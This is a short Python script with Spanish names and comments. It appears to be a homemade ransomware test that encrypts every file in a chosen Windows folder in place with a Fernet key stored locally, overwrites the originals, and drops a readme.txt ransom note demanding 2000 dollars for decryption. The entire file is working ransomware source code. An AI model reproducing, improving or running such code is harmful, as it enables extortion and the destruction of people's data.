from cryptography.fernet import Fernet
import os

def generar_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as archivo_key:
        archivo_key.write(key)

def cargar_key():
    return open('key.key', 'rb').read()

def encriptar(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as archivo:
            datos_archivo = archivo.read()
        datos_encriptados = f.encrypt(datos_archivo)
        with open(item, 'wb') as archivo:
            archivo.write(datos_encriptados)

if __name__ == '__main__':

    ruta_encriptar = 'C:\\Users\\fedua\\OneDrive\\Documents\\Ransomware\\Prueba'    #Se pone la dirrecion en donde se encuentra el archivo
    items = os.listdir(ruta_encriptar)
    ruta_completa = [ruta_encriptar+ '\\'+item for item in items]

    generar_key()
    key = cargar_key()

    encriptar(ruta_completa, key)

    with open(ruta_encriptar+ '\\'+'readme.txt', 'w') as archivo:
        archivo.write('Ficheros encriptados\n')
        archivo.write('Depositame 2000 dolares en la cuenta para desencriptarte el archivo :)')
